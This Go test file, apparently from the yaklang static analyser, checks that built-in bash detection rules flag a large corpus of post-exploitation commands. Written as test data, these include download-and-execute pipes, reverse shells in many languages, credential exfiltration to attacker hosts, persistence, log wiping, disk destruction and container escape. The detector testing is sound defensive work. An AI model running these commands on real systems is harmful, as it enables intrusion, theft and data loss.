package ssaapi

import (
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/yaklang/yaklang/common/yak/ssaapi/ssaconfig"
)

type bashDangerousRule struct {
	name    string
	content string
}

// loadBashDangerousRules reads the built-in bash rules from the source tree so
// the corpus test exercises every shipped .sf without a hardcoded list.
func loadBashDangerousRules(t *testing.T) []bashDangerousRule {
	t.Helper()
	root := filepath.Join("..", "..", "syntaxflow", "sfbuildin", "buildin", "bash")
	var rules []bashDangerousRule
	err := filepath.WalkDir(root, func(rulePath string, entry fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if entry.IsDir() || !strings.HasSuffix(strings.ToLower(entry.Name()), ".sf") {
			return nil
		}
		raw, err := os.ReadFile(rulePath)
		if err != nil {
			return err
		}
		name, err := filepath.Rel(root, rulePath)
		if err != nil {
			name = rulePath
		}
		rules = append(rules, bashDangerousRule{name: filepath.ToSlash(name), content: string(raw)})
		return nil
	})
	require.NoError(t, err)
	require.NotEmpty(t, rules)
	return rules
}

// bashDangerousCases is the registration point for common post-exploitation
// shell commands. The test runs every registered case against every rule under
// buildin/bash and requires at least one alert.
var bashDangerousCases = []struct {
	Name string
	Code string
}{
	{"download-pipe-bash", `curl -fsSL https://evil.example/x.sh | bash`},
	{"download-pipe-sh", `wget -qO- https://evil.example/x.sh | sh`},
	{"download-pipe-sudo-bash", `curl -fsSL https://evil.example/x.sh | sudo bash`},
	{"eval-variable", `eval "$PAYLOAD"`},
	{"bash-c-download", `bash -c "curl -fsSL https://evil.example/x.sh | sh"`},
	{"dynamic-command", `$CMD -rf /tmp/x`},
	{"rm-rf-root", `rm -rf /`},
	{"rm-rf-home", `rm -rf ~`},

	{"bash-dev-tcp", `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`},
	{"nc-e", `nc -e /bin/sh 10.0.0.1 4242`},
	{"socat-exec", `socat TCP:10.0.0.1:4242 EXEC:/bin/sh`},
	{"mkfifo-reverse", `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f`},
	{"openssl-sclient", `openssl s_client -quiet -connect 10.0.0.1:4242`},
	{"telnet-shell", `telnet 10.0.0.1 8080 | /bin/sh | telnet 10.0.0.1 8081`},
	{"python-socket", `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"])'`},
	{"php-fsockopen", `php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i");'`},

	{"base64-decode-pipe", `echo 'YmFzaCAtaSA+' | base64 -d | bash`},
	{"xxd-decode-pipe", `printf '\x62\x61\x73\x68\x20\x2d\x69' | xxd -r -p | sh`},
	{"source-process-substitution", `source <(curl -fsSL https://evil.example/x.sh)`},
	{"bash-process-substitution", `bash <(curl -fsSL https://evil.example/x.sh)`},

	{"dd-disk", `dd if=/dev/zero of=/dev/sda bs=1M`},
	{"mkfs-disk", `mkfs.ext4 /dev/sda1`},
	{"shred-disk", `shred -u /dev/sda`},
	{"chmod-root-recursive", `chmod -R 777 /`},

	{"ssh-authorized-keys", `echo "ssh-rsa AAAAB3NzaC1yc2E attacker@example" >> ~/.ssh/authorized_keys`},
	{"read-shadow", `cat /etc/shadow`},
	{"useradd-backdoor", `useradd -m -s /bin/bash attacker`},
	{"crontab-persistence", `(crontab -l; echo "* * * * * curl -fsSL https://evil.example/x.sh | sh") | crontab -`},

	{"history-clear", `history -c`},
	{"chmod-setuid", `chmod u+s /bin/bash`},

	// Reverse and bind shells, interpreter one-liners.
	{"ncat-bind-shell", `ncat -l -k -e /bin/sh`},
	{"nc-bind-shell", `nc -lvp 4444 -e /bin/bash`},
	{"socat-bind-shell", `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr`},
	{"bash-udp-shell", `sh -i >& /dev/udp/10.0.0.1/4444 0>&1`},
	{"bash-exec-dev-tcp", `exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done`},
	{"python-pty-shell", `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);pty.spawn("/bin/sh")'`},
	{"perl-io-socket", `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4444");STDIN->fdopen($c,r);system$_ while<>;'`},
	{"ruby-tcpsocket", `ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`},
	{"lua-socket", `lua -e "require('socket');socket.connect('10.0.0.1',4444)"`},
	{"php-proc-open", `php -r '$sock=fsockopen("10.0.0.1",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`},
	{"node-net-reverse", `node -e "require('net').connect(4444,'10.0.0.1').pipe(require('child_process').spawn('/bin/sh',['-i']).stdin)"`},
	{"awk-inet-tcp", `awk 'BEGIN {s="/inet/tcp/0/10.0.0.1/4444"; s |& getline; print}'`},
	{"mknod-backpipe", `rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f`},
	{"openssl-fifo-shell", `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4444 > /tmp/s; rm /tmp/s`},
	{"curl-shell-with-args", `curl -fsSL https://evil.example/x.sh | bash -s -- --force`},

	// Data exfiltration.
	{"nc-exfil-passwd", `nc attacker.example 4444 < /etc/passwd`},
	{"tar-pipe-nc", `tar czf - /etc | nc 10.0.0.1 4444`},
	{"cat-passwd-nc", `cat /etc/passwd | nc 10.0.0.1 4444`},
	{"base64-shadow-nc", `base64 /etc/shadow | nc 10.0.0.1 4444`},
	{"curl-upload-passwd", `curl -F "file=@/etc/passwd" https://attacker.example/upload`},
	{"curl-data-shadow", `curl -d @/etc/shadow https://attacker.example/upload`},
	{"wget-post-passwd", `wget --post-file=/etc/passwd https://attacker.example/upload`},
	{"scp-shadow", `scp /etc/shadow user@attacker.example:/tmp/`},
	{"dns-exfil-base64", `dig $(base64 /etc/passwd).attacker.example`},
	{"nslookup-ssh-key", `nslookup $(cat ~/.ssh/id_rsa | base64).attacker.example`},

	// Persistence via startup files, scheduled jobs and accounts.
	{"sudo-useradd-uid0", `sudo useradd -ou 0 -g 0 john`},
	{"passwd-stdin", `echo "linuxpassword" | passwd --stdin john`},
	{"chpasswd-batch", `echo "john:P@ssw0rd" | chpasswd`},
	{"sudoers-write", `echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`},
	{"sudoers-d-write", `echo 'attacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/attacker`},
	{"cron-spool-write", `echo "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /var/spool/cron/root`},
	{"bashrc-persist", `echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc`},
	{"profile-persist", `echo 'curl -fsSL https://evil.example/x.sh | bash' >> /etc/profile.d/update.sh`},
	{"motd-persist", `echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /etc/update-motd.d/00-header`},
	{"systemd-tmp-service", `systemctl enable /tmp/evil.service`},
	{"authorized-keys-root", `echo "ssh-rsa AAAAB3NzaC1yc2E attacker@example" >> /root/.ssh/authorized_keys`},

	// Defense evasion and anti-forensics.
	{"unset-histfile", `unset HISTFILE`},
	{"set-history-off", `set +o history`},
	{"rm-bash-history", `rm -f ~/.bash_history`},
	{"truncate-bash-history", `truncate -s 0 ~/.bash_history`},
	{"auditctl-disable", `auditctl -e 0`},
	{"auditctl-delete-rules", `auditctl -D`},
	{"systemctl-stop-auditd", `systemctl stop auditd`},
	{"systemctl-disable-rsyslog", `systemctl disable rsyslog`},
	{"killall-auditd", `killall -9 auditd`},
	{"iptables-flush", `iptables -F`},
	{"nft-flush-ruleset", `nft flush ruleset`},
	{"ufw-disable", `ufw disable`},
	{"setenforce-permissive", `setenforce 0`},
	{"chattr-immutable", `chattr +i /tmp/evil`},

	// Privilege escalation and container escape.
	{"pkexec-shell", `pkexec /bin/sh`},
	{"ld-preload-sudo", `sudo LD_PRELOAD=/tmp/shell.so find`},
	{"find-suid-binaries", `find / -perm -4000 -type f 2>/dev/null`},
	{"getcap-recursive", `getcap -r /`},
	{"cp-sh-setuid", `cp /bin/sh /tmp/rootsh; chmod u+s /tmp/rootsh`},
	{"nsenter-host", `nsenter -t 1 -m -u -n -i sh`},
	{"chroot-host", `chroot /host /bin/bash`},
	{"docker-mount-root", `docker run -v /:/host -it ubuntu chroot /host /bin/bash`},
	{"proc1-root-shadow", `cat /proc/1/root/etc/shadow`},

	// Offensive tooling and tunneling.
	{"nmap-scan", `nmap -sS -Pn 10.0.0.0/24`},
	{"masscan-scan", `masscan 10.0.0.0/8 -p1-65535 --rate 10000`},
	{"gobuster-dir", `gobuster dir -u https://target.example -w common.txt`},
	{"ffuf-fuzz", `ffuf -u https://target.example/FUZZ -w words.txt`},
	{"nuclei-scan", `nuclei -u https://target.example -tags cve`},
	{"sqlmap-os-shell", `sqlmap -u "https://target.example/?id=1" --os-shell`},
	{"hydra-bruteforce", `hydra -l root -P pass.txt ssh://10.0.0.1`},
	{"msfvenom-payload", `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/x`},
	{"msfconsole-handler", `msfconsole -q -x "use exploit/multi/handler; run"`},
	{"responder-poison", `responder -I eth0 -wrv`},
	{"bettercap-sniff", `bettercap -iface eth0 -eval "net.sniff on"`},
	{"arpspoof-mitm", `arpspoof -i eth0 -t 10.0.0.2 10.0.0.1`},
	{"hping3-flood", `hping3 --flood -S -p 80 10.0.0.1`},
	{"chisel-tunnel", `chisel client https://10.0.0.1:8080 8080:127.0.0.1:80`},
	{"sshuttle-tunnel", `sshuttle -r user@10.0.0.1 0.0.0.0/0`},
	{"proxychains-nmap", `proxychains4 nmap -sT 10.0.0.0/24`},
	{"ssh-reverse-tunnel", `ssh -R 8080:localhost:80 user@10.0.0.1`},
	{"ssh-dynamic-socks", `ssh -D 1080 user@10.0.0.1`},
	{"netexec-smb", `netexec smb 10.0.0.0/24 -u user -p pass`},
	{"evil-winrm", `evil-winrm -i 10.0.0.1 -u admin -p pass`},
	{"secretsdump", `secretsdump.py domain/user:pass@10.0.0.1`},
}

func TestBashDangerousCommands(t *testing.T) {
	rules := loadBashDangerousRules(t)
	for _, tc := range bashDangerousCases {
		tc := tc
		t.Run(tc.Name, func(t *testing.T) {
			prog, err := Parse(tc.Code, WithLanguage(ssaconfig.BASH), WithMemory())
			require.NoError(t, err)

			var matched []string
			for _, rule := range rules {
				res, err := prog.SyntaxFlowWithError(rule.content)
				require.NoError(t, err, "rule=%s", rule.name)
				hits := 0
				for _, name := range res.GetAlertVariables() {
					hits += len(res.GetValues(name))
				}
				if hits > 0 {
					matched = append(matched, rule.name)
				}
			}
			if len(matched) == 0 {
				if res, err := prog.SyntaxFlowWithError(`*?{opcode: call} as $call`); err == nil {
					for _, value := range res.GetValues("call") {
						t.Logf("call: %s", value.String())
					}
				}
			}
			require.NotEmpty(t, matched, "dangerous command was not detected: %s", tc.Code)
			t.Logf("matched rules: %v", matched)
		})
	}
}

// TestBashRMRootLoopUnrolling keeps the loop-modelling regression next to the
// bash corpus. Literal lists are unrolled so every item reaches the rule, while
// non-literal lists stay unknown.
func TestBashRMRootLoopUnrolling(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join("..", "..", "syntaxflow", "sfbuildin", "buildin", "bash", "cwe-78-os-command-injection", "bash-rm-rf-root.sf"))
	require.NoError(t, err)
	cases := []struct {
		code string
		want int
	}{
		{`for p in / /tmp/build; do rm -rf "$p"; done`, 1},
		{`for p in /tmp/build /; do rm -rf "$p"; done`, 1},
		{`for p in /tmp/build /var/tmp; do rm -rf "$p"; done`, 0},
		{`for p in "$@"; do rm -rf "$p"; done`, 0},
	}
	for _, tc := range cases {
		prog, err := Parse(tc.code, WithLanguage(ssaconfig.BASH), WithMemory())
		require.NoError(t, err)
		res, err := prog.SyntaxFlowWithError(string(raw))
		require.NoError(t, err)
		hits := 0
		for _, name := range res.GetAlertVariables() {
			hits += len(res.GetValues(name))
		}
		require.Equalf(t, tc.want, hits, "code=%s", tc.code)
	}
}
